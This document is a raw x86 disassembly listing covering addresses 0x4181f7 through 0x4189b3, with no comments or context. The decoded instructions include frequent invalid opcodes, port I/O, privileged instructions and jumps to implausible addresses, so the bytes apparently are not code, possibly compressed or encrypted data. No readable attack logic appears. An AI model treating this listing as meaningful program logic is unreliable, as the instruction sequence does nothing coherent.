  4181f7:	call   0x7cc1:0x4d180e8a
  4181fe:	sub    al,0x9c
  418200:	xchg   DWORD PTR [ebx+0x6a82c4b],ebx
  418206:	mov    bh,0x32
  418208:	cmp    ah,BYTE PTR ds:0x2ff7c436
  41820e:	adc    al,0x2a
  418210:	xor    BYTE PTR [eax+0x69],0x76
  418214:	cmp    bl,bh
  418216:	pop    edx
  418217:	out    0x77,eax
  418219:	dec    esi
  41821a:	fist   DWORD PTR [esp+ecx*1]
  41821d:	outs   dx,BYTE PTR ds:[esi]
  41821e:	cmp    eax,0xdafab82b
  418223:	hlt    
  418224:	jno    0x418290
  418226:	dec    ebx
  418227:	call   0xb2bdf9a4
  41822c:	out    dx,eax
  41822d:	cmp    esp,DWORD PTR [eax]
  41822f:	push   eax
  418230:	mov    cl,0x76
  418232:	xor    BYTE PTR ds:0x72280372,bh
  418238:	xchg   ebp,eax
  418239:	pushw  cs
  41823b:	out    0xe1,al
  41823d:	arpl   WORD PTR [ebp+ebx*8+0x1],sp
  418241:	xchg   ebp,eax
  418242:	int    0x38
  418244:	xchg   ebp,eax
  418245:	pop    edi
  418246:	fincstp 
  418248:	(bad)  
  418249:	pop    ds
  41824a:	mov    edi,0x3bc96806
  41824f:	das    
  418250:	xchg   edx,eax
  418251:	test   al,0x11
  418253:	push   0xb439c9d3
  418258:	bswap  esp
  41825a:	leave  
  41825b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41825c:	pop    edi
  41825d:	cmp    BYTE PTR cs:[ecx-0x6a2908ee],0x84
  418265:	jb     0x418288
  418267:	scas   al,BYTE PTR es:[edi]
  418268:	cmp    BYTE PTR [edi-0x31],ah
  41826b:	popf   
  41826c:	jmp    0x5671:0xd1d65f8c
  418273:	mov    ch,0xb5
  418275:	sbb    DWORD PTR [eax],0x48
  418278:	dec    esi
  418279:	out    0xa4,al
  41827b:	leave  
  41827c:	mul    ch
  41827e:	push   ebp
  41827f:	inc    ebp
  418280:	cmp    BYTE PTR [esi-0x13],dh
  418283:	xchg   ebx,eax
  418284:	xchg   ebx,eax
  418285:	push   edx
  418286:	and    edi,DWORD PTR [ebx]
  418288:	mov    eax,0xcf4ff37b
  41828d:	into   
  41828e:	nop
  41828f:	imul   esi,DWORD PTR [edx],0x26
  418292:	xchg   esp,eax
  418293:	test   DWORD PTR [edx-0x3a],eax
  418296:	in     eax,dx
  418297:	jge    0x418291
  418299:	mov    eax,0x353c6310
  41829e:	dec    ebx
  41829f:	push   ss
  4182a0:	fsubrp st(4),st
  4182a2:	and    eax,0x95145630
  4182a7:	jecxz  0x41827b
  4182a9:	ja     0x4182a2
  4182ab:	cmp    eax,0xf885dd1c
  4182b0:	push   ebx
  4182b1:	sub    ch,BYTE PTR [ecx-0x38]
  4182b4:	cmp    al,0x8e
  4182b6:	dec    ebx
  4182b7:	xchg   edx,eax
  4182b8:	sub    eax,0x3a041ad6
  4182bd:	cmp    eax,0x15308201
  4182c2:	lock sub DWORD PTR [esi],0xe
  4182c6:	or     edx,DWORD PTR [ecx-0x33]
  4182c9:	and    ebp,0xa9db8ee
  4182cf:	aam    0xc7
  4182d1:	push   esp
  4182d2:	xor    eax,0x34b59b83
  4182d7:	inc    eax
  4182d8:	imul   esi,DWORD PTR [edi-0x49],0x3c
  4182dc:	sbb    BYTE PTR ds:[ebx-0x7e],ah
  4182e0:	sub    eax,0x8bb0a33d
  4182e5:	aad    0x1b
  4182e7:	daa    
  4182e8:	mov    ebp,0x65a4674d
  4182ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4182ee:	(bad)  
  4182ef:	call   0xcd2e174f
  4182f4:	stc    
  4182f5:	and    esp,ebx
  4182f7:	out    0x83,al
  4182f9:	or     ah,BYTE PTR [ebx-0x6d]
  4182fc:	in     al,0x93
  4182fe:	scas   al,BYTE PTR es:[edi]
  4182ff:	fs push ebp
  418301:	push   ss
  418302:	dec    edi
  418303:	aas    
  418304:	dec    ebx
  418305:	mov    dh,0x16
  418307:	xchg   DWORD PTR [eax],ecx
  418309:	mov    eax,cs
  41830b:	sub    esi,DWORD PTR [edi-0x50]
  41830e:	mov    ecx,0x100cc806
  418313:	bound  ebp,QWORD PTR [esi]
  418315:	mov    cl,0xc7
  418317:	lahf   
  418318:	lea    esi,[edi-0x231338d3]
  41831e:	inc    eax
  41831f:	jge    0x41833b
  418321:	xor    al,0x2d
  418323:	and    eax,0x20eb50b0
  418328:	push   ss
  418329:	pusha  
  41832a:	fisttp QWORD PTR [ebp+0x30]
  41832d:	inc    esp
  41832e:	(bad)  
  41832f:	mov    ah,0xc9
  418331:	std    
  418332:	(bad)  
  418333:	mov    edi,eax
  418335:	jb     0x4183a8
  418337:	xchg   esi,eax
  418338:	adc    al,0x90
  41833a:	imul   ecx,DWORD PTR [ebx+0x78],0x79
  41833e:	and    BYTE PTR [esi-0x45f8d025],bh
  418344:	inc    edi
  418345:	ja     0x418397
  418347:	xchg   esp,eax
  418348:	xor    al,0x7
  41834a:	sub    al,0xbd
  41834c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41834d:	adc    DWORD PTR [edi],ecx
  41834f:	add    eax,0x549020e6
  418354:	popf   
  418355:	xchg   ebp,eax
  418356:	jns    0x418349
  418358:	xchg   ebx,eax
  418359:	into   
  41835a:	popa   
  41835b:	out    0x8a,eax
  41835d:	(bad)  
  41835e:	xchg   edx,eax
  41835f:	or     al,0x4a
  418361:	cmp    BYTE PTR [ecx+0x1d],dl
  418364:	sbb    eax,0xf36772fc
  418369:	mov    ecx,0xbf3f7088
  41836e:	lea    ebx,[ebp+0x42]
  418371:	dec    esi
  418372:	cli    
  418373:	push   0xe8f742a9
  418378:	ret    0x2ef1
  41837b:	shl    ecx,0xe4
  41837e:	dec    esp
  41837f:	popf   
  418380:	xchg   BYTE PTR [ebx],ah
  418382:	(bad)  
  418383:	pop    DWORD PTR [ecx-0x3bd8d941]
  418389:	imul   edi,esp,0xffffff8a
  41838c:	sbb    eax,0xeb2ece0
  418391:	and    BYTE PTR [ebx-0x28],ah
  418394:	inc    ebx
  418395:	and    dh,BYTE PTR [ebx-0x68f33142]
  41839b:	retf   0x5443
  41839e:	ret    0x8c6d
  4183a1:	(bad)  
  4183a2:	fwait
  4183a3:	hlt    
  4183a4:	rcl    edx,0x7
  4183a7:	in     al,0x91
  4183a9:	inc    ecx
  4183aa:	xchg   edi,eax
  4183ab:	jle    0x4183e9
  4183ad:	push   ds
  4183ae:	add    eax,0xe6a73df
  4183b3:	(bad)  
  4183b4:	cmp    ebx,DWORD PTR [ecx+0x17]
  4183b7:	jl     0x4183b9
  4183b9:	sub    BYTE PTR [esi-0x71ec6916],bh
  4183bf:	loope  0x4183f6
  4183c1:	jle    0x4183fe
  4183c3:	je     0x418433
  4183c5:	(bad)  
  4183c6:	imul   ecx,DWORD PTR [ebx],0x31
  4183c9:	jno    0x418361
  4183cb:	fcmovnb st,st(4)
  4183cd:	cmp    esi,edi
  4183cf:	mov    ds:0xb7299a73,al
  4183d4:	xchg   ebp,eax
  4183d5:	add    BYTE PTR [ecx+0x63b02c00],dl
  4183db:	pop    ss
  4183dc:	loope  0x418432
  4183de:	rcl    dh,1
  4183e0:	mov    esi,0xf79958ac
  4183e5:	retf   0xead4
  4183e8:	or     bl,0x36
  4183eb:	dec    eax
  4183ec:	sti    
  4183ed:	push   0xffffffb8
  4183ef:	(bad)  
  4183f1:	sbb    ecx,DWORD PTR [ebx-0x7b1024db]
  4183f7:	mov    ecx,0x22ad3935
  4183fc:	enter  0x95e0,0xf7
  418400:	aas    
  418401:	mov    bh,0xf7
  418403:	jae    0x41844f
  418405:	ficomp WORD PTR [ecx+eax*8-0x48]
  418409:	dec    edx
  41840a:	add    esp,DWORD PTR [edi+0x37]
  41840d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41840e:	shl    BYTE PTR [esi-0x5fa07637],1
  418414:	test   ebp,ebp
  418416:	cmp    al,0x63
  418418:	mov    ds:0xa335ee2a,al
  41841d:	(bad)
  418421:	gs test eax,0x564ad6b3
  418427:	jecxz  0x41840b
  418429:	test   BYTE PTR [ecx+0x39],dl
  41842c:	sahf   
  41842d:	test   BYTE PTR [edx+0x5e],bl
  418430:	sbb    DWORD PTR [eax+eiz*1+0x17],ebx
  418434:	mov    eax,ds:0x42ef86c1
  418439:	nop
  41843a:	les    ebp,FWORD PTR [edx+0x73c4cd58]
  418440:	sub    BYTE PTR [edx-0x17],0xb4
  418444:	sbb    ch,bh
  418446:	leave  
  418447:	mov    al,0x47
  418449:	sbb    al,0x1d
  41844b:	mov    eax,ds:0x671109e
  418450:	es jne 0x41847b
  418453:	sbb    al,0x14
  418455:	push   ebp
  418456:	add    DWORD PTR [ecx],0x24
  418459:	ins    DWORD PTR es:[edi],dx
  41845a:	inc    ebx
  41845b:	push   esi
  41845c:	mov    eax,0xfc58a374
  418461:	cmp    DWORD PTR [eax],edi
  418463:	lock es jb 0x4184e2
  418467:	add    al,0x18
  418469:	fistp  DWORD PTR [edx+0x4d]
  41846c:	inc    ebp
  41846d:	jnp    0x4184ac
  41846f:	push   ss
  418470:	mov    ebx,0x5ec58ef2
  418475:	and    eax,0x7305879e
  41847a:	je     0x418462
  41847c:	jae    0x4184f2
  41847e:	sub    eax,0xfac40cb2
  418483:	xchg   edi,ecx
  418485:	lea    esi,[edx+0x47]
  418488:	ins    DWORD PTR es:[edi],dx
  418489:	ret    
  41848a:	push   0xffffffb1
  41848c:	repnz xchg ebx,eax
  41848e:	mov    ds:0x6521cfd2,al
  418493:	cld    
  418494:	add    eax,0xd317532a
  418499:	clc    
  41849a:	iret   
  41849b:	scas   al,BYTE PTR es:[edi]
  41849c:	in     eax,dx
  41849d:	xchg   ebx,eax
  41849e:	in     al,0xfc
  4184a0:	cmp    DWORD PTR [ecx],ebx
  4184a2:	lods   eax,DWORD PTR ds:[esi]
  4184a3:	outs   dx,DWORD PTR ds:[esi]
  4184a4:	xor    eax,0x2501e477
  4184a9:	pop    eax
  4184aa:	fidiv  DWORD PTR [ecx]
  4184ac:	mov    BYTE PTR [edi],dh
  4184ae:	xchg   ecx,eax
  4184af:	fwait
  4184b0:	mov    edi,0x4c654cd1
  4184b5:	mov    esp,0x633cd490
  4184ba:	mov    dl,ch
  4184bc:	in     al,0xa7
  4184be:	and    ah,BYTE PTR ds:0xdba18449
  4184c4:	dec    ecx
  4184c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4184c6:	loopne 0x41853e
  4184c8:	imul   ecx,ebp,0xffffff97
  4184cb:	push   cs
  4184cc:	addr16 test al,0xeb
  4184d0:	ret    
  4184d1:	jne    0x418487
  4184d3:	popa   
  4184d4:	leave  
  4184d5:	push   esi
  4184d6:	xor    BYTE PTR [ebp-0x35],0x7c
  4184da:	mov    ds:0xc56cbd69,al
  4184df:	xor    al,0xcd
  4184e1:	adc    al,BYTE PTR [eax]
  4184e3:	dec    ecx
  4184e4:	push   ecx
  4184e5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4184e6:	xchg   DWORD PTR [edi-0x27d3df1d],ecx
  4184ec:	mov    ah,0x40
  4184ee:	pop    esi
  4184ef:	sbb    BYTE PTR [esi],dl
  4184f1:	nop
  4184f2:	jae    0x418480
  4184f4:	dec    edi
  4184f5:	into   
  4184f6:	push   edx
  4184f7:	ja     0x4184f3
  4184f9:	cmp    eax,0x82d237d2
  4184fe:	cmp    ah,bh
  418500:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418501:	inc    esp
  418502:	scas   al,BYTE PTR es:[edi]
  418503:	push   ss
  418504:	mov    ds:0x33dd8884,eax
  418509:	pop    esi
  41850a:	adc    BYTE PTR [eax],ah
  41850c:	pop    edi
  41850d:	mov    ecx,0x2557a7e8
  418512:	mov    al,ds:0xf309dc94
  418517:	mov    al,0x9d
  418519:	xchg   ebp,eax
  41851a:	(bad)  
  41851b:	pop    edi
  41851c:	xchg   esp,eax
  41851d:	inc    ebx
  41851e:	dec    ecx
  41851f:	pop    DWORD PTR [edx]
  418521:	stos   BYTE PTR es:[edi],al
  418522:	loop   0x418520
  418524:	jp     0x41854c
  418526:	(bad)  
  418527:	loopne 0x4184e8
  418529:	into   
  41852a:	mov    al,0xd0
  41852c:	dec    ebp
  41852d:	and    BYTE PTR [esi+0x60b8576b],0x77
  418534:	loopne 0x4184cf
  418536:	pop    ss
  418537:	fbstp  TBYTE PTR [edi+0x64a86cd8]
  41853d:	rcr    ebp,1
  41853f:	test   al,0xe4
  418541:	xchg   ebp,eax
  418542:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418543:	ret    0x8a25
  418546:	jmp    0x4185ae
  418548:	popa   
  418549:	popa   
  41854a:	je     0x41857c
  41854c:	repnz dec edx
  41854e:	add    eax,0x974126aa
  418553:	xchg   DWORD PTR [edx],edi
  418555:	and    DWORD PTR [eax-0x2585ac9a],esi
  41855b:	pusha  
  41855c:	adc    ah,BYTE PTR [eax+0x191b5463]
  418562:	inc    ecx
  418563:	es inc ecx
  418565:	pop    ebp
  418566:	test   dl,dh
  418568:	push   edx
  41856a:	ins    BYTE PTR es:[edi],dx
  41856b:	aad    0xef
  41856d:	aad    0xea
  41856f:	xchg   ebp,eax
  418570:	cli    
  418571:	sub    DWORD PTR [eax-0x62],edx
  418574:	adc    BYTE PTR [eax+esi*2+0x58],ah
  418578:	in     eax,0x94
  41857a:	sbb    eax,0xc13bcbe4
  41857f:	jnp    0x41850a
  418581:	ficom  WORD PTR [edi]
  418583:	dec    ebp
  418584:	std    
  418585:	ficom  DWORD PTR [ebp+0x66]
  418588:	lahf   
  418589:	scas   al,BYTE PTR es:[edi]
  41858a:	or     eax,0xc6040354
  41858f:	pop    esp
  418590:	hlt    
  418591:	scas   eax,DWORD PTR es:[edi]
  418592:	icebp  
  418593:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418594:	mov    bh,0xb9
  418596:	inc    esp
  418597:	fwait
  418598:	cmc    
  418599:	rcpps  xmm4,xmm1
  41859c:	clc    
  41859d:	shl    BYTE PTR [eax+0x76b5fb86],1
  4185a3:	inc    eax
  4185a4:	mov    al,0xd1
  4185a6:	stos   BYTE PTR es:[edi],al
  4185a7:	pop    ebx
  4185a8:	pop    ss
  4185a9:	addr16 test al,0xe6
  4185ac:	in     al,0xc2
  4185ae:	imul   esi,DWORD PTR [ebp+0x1bb394f0],0x3317807f
  4185b8:	sbb    eax,0xf2e8292e
  4185bd:	stc    
  4185be:	sub    BYTE PTR [ebx+0x31],0xb6
  4185c2:	cli    
  4185c3:	jle    0x418592
  4185c5:	stos   BYTE PTR es:[edi],al
  4185c6:	xor    bh,dl
  4185c8:	pop    eax
  4185c9:	icebp  
  4185ca:	mov    dl,0x1
  4185cc:	into   
  4185cd:	pop    es
  4185ce:	fsubr  st,st(5)
  4185d0:	mov    WORD PTR [ecx],es
  4185d2:	imul   ebp,DWORD PTR [eax+edx*2-0x3d],0xffffff87
  4185d7:	mov    ebx,0x5cf48adb
  4185dc:	mov    DWORD PTR [ebx+ebp*8],edx
  4185df:	push   0xd93e44ab
  4185e4:	out    0xf1,eax
  4185e6:	pushf  
  4185e7:	aaa    
  4185e8:	int3   
  4185e9:	or     bl,BYTE PTR [ecx+eax*2]
  4185ec:	xor    bh,BYTE PTR [ebx]
  4185ee:	jno    0x41860f
  4185f0:	sub    BYTE PTR [ebp-0x4572cef2],cl
  4185f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4185f7:	cmp    ah,al
  4185f9:	outs   dx,DWORD PTR cs:[esi]
  4185fb:	dec    ebx
  4185fc:	xor    bh,BYTE PTR [esi+ecx*8+0x48]
  418600:	dec    edi
  418601:	les    esp,FWORD PTR [esi+0x27ade5ff]
  418607:	xchg   BYTE PTR [ebx-0x529b294f],al
  41860d:	jbe    0x4185c6
  41860f:	push   0x88e67869
  418614:	jle    0x41867a
  418616:	fisub  WORD PTR [esi]
  418618:	mov    DWORD PTR ds:0xe060e61e,ebx
  41861e:	jmp    0x4ec8:0x5754028f
  418625:	inc    BYTE PTR [edx]
  418627:	mov    edi,0x72b3976d
  41862c:	and    bl,bh
  41862e:	mov    dl,BYTE PTR [edx+ecx*1+0x13]
  418632:	and    ch,BYTE PTR [ecx-0x2865aa8b]
  418638:	test   DWORD PTR [edx+edx*4+0x199b99ec],eax
  41863f:	dec    esp
  418640:	lods   al,BYTE PTR ds:[esi]
  418641:	add    bl,BYTE PTR [ecx-0x5c]
  418644:	fyl2xp1 
  418646:	(bad)  
  418647:	pusha  
  418648:	popa   
  418649:	jo     0x418603
  41864b:	jns    0x4185cd
  41864d:	dec    ebp
  41864e:	and    al,0x36
  418650:	lock cmp al,0x61
  418653:	aaa    
  418654:	inc    ebp
  418655:	shr    DWORD PTR [ebp+0x26797949],0x67
  41865c:	sar    BYTE PTR [esi-0x60],cl
  41865f:	fdivr  QWORD PTR [eax+0x4d8574eb]
  418665:	scas   eax,DWORD PTR es:[edi]
  418666:	and    eax,0x5cd39422
  41866b:	adc    al,0xe7
  41866d:	dec    eax
  41866e:	adc    BYTE PTR [ebx+0x39330f4d],dl
  418674:	das    
  418675:	push   0xffffff80
  418677:	cmp    cl,BYTE PTR [esi+0x683e32a4]
  41867d:	cmc    
  41867e:	dec    edx
  41867f:	sti    
  418680:	dec    ecx
  418681:	push   0xffffffe5
  418683:	xor    ch,bl
  418685:	aaa    
  418686:	adc    al,0x49
  418688:	cmp    dh,BYTE PTR [ebx+0x2c]
  41868b:	adc    eax,ecx
  41868d:	ins    DWORD PTR es:[edi],dx
  41868e:	in     al,0xd7
  418690:	xchg   esp,eax
  418691:	dec    esi
  418692:	std    
  418693:	inc    ecx
  418694:	add    edi,DWORD PTR [ebx]
  418696:	sub    edi,DWORD PTR ds:0x7a8295fa
  41869c:	sbb    DWORD PTR [edi+0x8],0x58
  4186a0:	cld    
  4186a1:	adc    ah,ch
  4186a3:	dec    esp
  4186a4:	sub    BYTE PTR [edi+0x6cc35cfc],ch
  4186aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4186ab:	push   ebp
  4186ac:	adc    dh,BYTE PTR ds:0x9fc0d2c4
  4186b2:	mov    bh,0xf9
  4186b4:	jne    0x41869c
  4186b6:	iret   
  4186b7:	out    0xc5,eax
  4186b9:	push   ss
  4186ba:	mov    edx,0xce51185c
  4186bf:	(bad)  [eax+ebx*2]
  4186c2:	cmp    ebp,DWORD PTR [eax-0x6b]
  4186c5:	in     al,0xd0
  4186c7:	out    0x58,eax
  4186c9:	ds dec DWORD PTR ss:[ebp+0x69]
  4186ce:	inc    edi
  4186cf:	test   BYTE PTR [edx],ch
  4186d1:	inc    edx
  4186d2:	lods   al,BYTE PTR ds:[esi]
  4186d3:	int    0x3b
  4186d5:	je     0x41874c
  4186d7:	ficom  DWORD PTR [ebx*8+0x499fc6ee]
  4186de:	add    eax,0xb9f37d2e
  4186e3:	xor    ch,BYTE PTR [edx+0x29ca78a3]
  4186e9:	pop    eax
  4186ea:	(bad)
  4186ee:	inc    edi
  4186ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4186f0:	loope  0x4186c7
  4186f2:	stos   BYTE PTR es:[edi],al
  4186f3:	jmp    0xefc78b32
  4186f8:	push   ss
  4186f9:	mov    dl,0x9
  4186fb:	rcr    DWORD PTR [edx+0xd],cl
  4186fe:	push   cs
  4186ff:	push   eax
  418700:	xor    BYTE PTR [edi*8+0x621e4116],ch
  418707:	jnp    0x4186de
  418709:	or     DWORD PTR [ecx+ebx*2-0x3dc09ec1],0xed258d61
  418714:	aaa    
  418715:	or     DWORD PTR [edi],ebx
  418717:	int    0xff
  418719:	lds    ebp,FWORD PTR [ecx]
  41871b:	inc    ecx
  41871c:	push   0x2f
  41871e:	pusha  
  41871f:	sub    al,0xbb
  418721:	lods   eax,DWORD PTR ds:[esi]
  418722:	mov    edi,DWORD PTR [esi]
  418724:	stc    
  418725:	shl    esp,1
  418727:	mov    bh,0xa0
  418729:	push   ecx
  41872a:	jns    0x4186ee
  41872c:	and    dh,bl
  41872e:	fild   DWORD PTR [edx-0x39]
  418731:	(bad)  
  418732:	push   0x19756edf
  418737:	and    eax,0x675db42
  41873c:	add    esi,DWORD PTR [ebp-0x29]
  41873f:	in     al,dx
  418740:	sub    al,0x20
  418742:	cmp    eax,0x18a946fb
  418747:	jmp    0x418732
  418749:	mov    ebp,0x4e053984
  41874e:	and    eax,0xb772bbdf
  418753:	push   es
  418754:	jno    0x418763
  418756:	xchg   ecx,eax
  418757:	sbb    eax,0x4408f21f
  41875c:	xor    eax,ebx
  41875e:	fnsave [edi]
  418760:	ret    0x31b0
  418763:	mov    ecx,DWORD PTR ds:[eax-0x4d]
  418767:	sar    BYTE PTR [ebx],0x69
  41876a:	retf   0xc3a3
  41876d:	arpl   WORD PTR [edi-0x7bdaaf46],bx
  418773:	out    0x87,al
  418775:	xchg   ecx,eax
  418776:	push   es
  418777:	pop    ds
  418778:	loope  0x41875a
  41877a:	ror    bh,0x74
  41877d:	shl    DWORD PTR [ecx],0x37
  418780:	push   esp
  418781:	loop   0x4187ea
  418783:	push   edx
  418784:	ja     0x4187da
  418786:	mov    ebp,0xfe9014f5
  41878b:	out    dx,eax
  41878c:	jl     0x418754
  41878e:	outs   dx,DWORD PTR ds:[esi]
  41878f:	sbb    dh,BYTE PTR [edi]
  418791:	mov    ebx,0x4fdf5a0
  418796:	repz sbb cl,bl
  418799:	fstp   TBYTE PTR [ebp+0x34b16b7f]
  41879f:	aad    0xbf
  4187a1:	imul   esp,DWORD PTR ds:0x3eb39ffc,0xd28060a7
  4187ab:	idiv   dl
  4187ad:	push   ss
  4187ae:	jnp    0x4187c8
  4187b0:	loop   0x4187e8
  4187b2:	lmsw   WORD PTR [edi]
  4187b5:	xor    BYTE PTR [ebp+0x6685666f],al
  4187bb:	or     ch,BYTE PTR [ecx+0x22]
  4187be:	dec    ebx
  4187bf:	push   edx
  4187c0:	out    dx,eax
  4187c1:	mov    ah,0x7e
  4187c3:	fsub   DWORD PTR [edi+0x79f94d02]
  4187c9:	add    al,BYTE PTR [ebx-0xc9765b1]
  4187cf:	mov    ebx,0x1bcb36a
  4187d4:	cld    
  4187d5:	xchg   edx,eax
  4187d6:	pop    edx
  4187d7:	(bad)  
  4187d8:	enter  0x2fad,0xe7
  4187dc:	mov    ch,0xcc
  4187de:	mov    al,ds:0x2a92ebd8
  4187e3:	add    eax,0x49159c6d
  4187e8:	adc    eax,0x76362974
  4187ed:	ins    BYTE PTR es:[edi],dx
  4187ee:	and    BYTE PTR [esi-0x3d9a5df3],0xdd
  4187f5:	or     edx,ebx
  4187f7:	push   eax
  4187f8:	imul   edi,DWORD PTR [esi+0x42],0xffffffef
  4187fc:	iret   
  4187fd:	push   0x5e
  4187ff:	mov    esp,0x28a0e4b2
  418804:	and    BYTE PTR [ecx],al
  418806:	(bad)  
  418807:	cld    
  418808:	push   eax
  418809:	popa   
  41880a:	pop    ebx
  41880b:	pop    esi
  41880c:	int    0xf8
  41880e:	out    dx,eax
  41880f:	ror    ebp,1
  418811:	shr    BYTE PTR [esi-0x61],0x80
  418815:	mov    eax,DWORD PTR [ecx+0x3791a0c1]
  41881b:	(bad)  
  41881c:	xchg   esi,eax
  41881d:	jnp    0x418892
  41881f:	es xchg edi,eax
  418821:	shl    BYTE PTR [ebp-0x41],0xc1
  418825:	shl    BYTE PTR [eax-0x22],0x25
  418829:	in     al,0xfc
  41882b:	jne    0x418857
  41882d:	sub    al,0xcf
  41882f:	imul   eax,DWORD PTR [ebx-0x28bc8487],0x57
  418836:	or     DWORD PTR [edi],eax
  418838:	or     bl,BYTE PTR [eax]
  41883a:	and    eax,0x3910554c
  41883f:	pop    edx
  418840:	sub    DWORD PTR [esp+ebx*1+0x79],esi
  418844:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418845:	sub    BYTE PTR [ebp-0x40c73ac7],bh
  41884b:	out    0xf8,eax
  41884d:	neg    BYTE PTR [eax+0x22ad8f7a]
  418853:	and    BYTE PTR [ebx-0x6d35ab57],dh
  418859:	pop    ss
  41885a:	pushf  
  41885b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41885c:	inc    esi
  41885d:	(bad)  
  41885e:	stos   DWORD PTR es:[edi],eax
  41885f:	test   BYTE PTR [ecx+0x45b06528],ch
  418865:	xchg   BYTE PTR [esi+eax*4],cl
  418868:	jb     0x41883a
  41886a:	jl     0x4188db
  41886c:	in     eax,0xd6
  41886e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41886f:	(bad)
  418872:	adc    esi,edi
  418874:	mov    cl,0x35
  418876:	rol    DWORD PTR [ebp+0x7cbed10f],cl
  41887c:	loopne 0x418813
  41887e:	xchg   ecx,eax
  41887f:	pop    ss
  418880:	fwait
  418881:	icebp  
  418882:	fadd   QWORD PTR [esi]
  418884:	std    
  418885:	nop
  418886:	push   esp
  418887:	arpl   WORD PTR [edi+0x44f3249],bx
  41888d:	mov    dl,0x5b
  41888f:	add    ecx,0x3b
  418892:	mov    eax,ds:0x93f6dc0d
  418897:	xlat   BYTE PTR ds:[ebx]
  418898:	push   edx
  418899:	push   edx
  41889a:	mov    edx,esi
  41889c:	int3   
  41889d:	mov    BYTE PTR [edx],bl
  41889f:	les    edi,FWORD PTR [ebx-0x76]
  4188a2:	outs   dx,BYTE PTR ds:[esi]
  4188a3:	ficomp WORD PTR [ecx]
  4188a5:	ret    0xdac6
  4188a8:	or     edx,DWORD PTR [eax]
  4188aa:	and    BYTE PTR [eax],bl
  4188ac:	stos   BYTE PTR es:[edi],al
  4188ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4188ae:	dec    esp
  4188af:	or     cl,BYTE PTR [ebx+0x72]
  4188b2:	mov    ss,WORD PTR [ebp-0x20]
  4188b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4188b6:	pushf  
  4188b7:	add    dh,0xc8
  4188ba:	fsub   QWORD PTR [ecx]
  4188bc:	scas   eax,DWORD PTR es:[edi]
  4188bd:	xlat   BYTE PTR ds:[ebx]
  4188be:	fstp   TBYTE PTR [edx-0x24]
  4188c1:	repnz add DWORD PTR [ebx],ebp
  4188c4:	dec    ebp
  4188c5:	arpl   WORD PTR [ebx-0x137a7a30],bp
  4188cb:	mov    al,0x4e
  4188cd:	aaa    
  4188ce:	xor    bh,dl
  4188d0:	daa    
  4188d1:	je     0x418863
  4188d3:	sbb    DWORD PTR [ecx-0x3a],0xc3cf822e
  4188da:	pushf  
  4188db:	cmp    DWORD PTR [edx],0xc69e060d
  4188e1:	call   0xc892:0x5d61223d
  4188e8:	jbe    0x418939
  4188ea:	mov    eax,0x77284a01
  4188ef:	arpl   WORD PTR [esi],bp
  4188f1:	lods   eax,DWORD PTR ds:[esi]
  4188f2:	add    al,0x1
  4188f4:	dec    esi
  4188f5:	xor    BYTE PTR [eax+ecx*2+0x76],bh
  4188f9:	call   0xf986:0x8b8d5640
  418900:	repnz inc ebp
  418902:	lea    edi,[edi+0x11]
  418905:	push   0xffffff93
  418907:	loopne 0x418918
  418909:	jns    0x4188f4
  41890b:	and    al,0xcd
  41890d:	fs or  eax,0x86433d0b
  418913:	adc    bl,BYTE PTR [ebp-0x44]
  418916:	stos   BYTE PTR es:[edi],al
  418917:	lods   eax,DWORD PTR ds:[esi]
  418918:	xchg   esi,eax
  418919:	dec    BYTE PTR [edx+0x1f]
  41891c:	ss lahf 
  41891e:	jecxz  0x4188cc
  418920:	lea    eax,[eax]
  418922:	fsubr  QWORD PTR [esi]
  418924:	mov    dh,0xf3
  418926:	add    ebp,DWORD PTR [ecx+0x3f61817e]
  41892c:	and    eax,0x4129e279
  418931:	mov    ds:0xfbcbe818,al
  418936:	arpl   WORD PTR [esi-0x62407390],si
  41893c:	sbb    al,BYTE PTR [eax+0x72]
  41893f:	dec    edx
  418940:	adc    eax,0x90da6c11
  418945:	push   0xffffff8a
  418947:	inc    ebx
  418948:	xchg   edi,eax
  418949:	sub    BYTE PTR [eax+0x51988ba4],cl
  41894f:	fstp   DWORD PTR [ebx+0x68fcc916]
  418955:	cwde   
  418956:	mov    BYTE PTR [esi],dh
  418958:	cmp    dh,BYTE PTR [ecx+0x7c]
  41895b:	popf   
  41895c:	and    esp,DWORD PTR [edi-0x1e441988]
  418962:	in     eax,0x57
  418964:	jmp    0x18eb:0x2cf75e38
  41896b:	test   esp,ebx
  41896d:	popf   
  41896e:	out    0x5c,eax
  418970:	std    
  418971:	cmp    cl,ch
  418973:	push   0xb
  418975:	cld    
  418976:	fsubr  DWORD PTR [esi+0x4a]
  418979:	jne    0x41894a
  41897b:	outs   dx,BYTE PTR ds:[esi]
  41897c:	dec    ebp
  41897d:	(bad)  
  41897f:	mov    esi,0x2261cf22
  418984:	mov    bl,0x91
  418986:	sahf   
  418987:	push   0xfffffff0
  418989:	test   BYTE PTR ds:0xb70eb710,ah
  41898f:	jl     0x4189f5
  418991:	mov    dl,0xce
  418993:	jb     0x41892c
  418995:	push   ebx
  418996:	(bad)  
  418997:	mov    al,0x92
  418999:	push   ss
  41899a:	xchg   ecx,eax
  41899b:	pushf  
  41899c:	lea    esi,[eax]
  41899e:	test   al,0x78
  4189a0:	push   esp
  4189a1:	mov    DWORD PTR [edi+0x115b83a8],ecx
  4189a7:	std    
  4189a8:	push   ebx
  4189a9:	sub    al,BYTE PTR [edx+edx*8]
  4189ac:	or     BYTE PTR [eax+0xa4d7747],ch
  4189b2:	pop    eax
  4189b3:	sar    DWORD PTR [ecx-0x6e76ae24],1
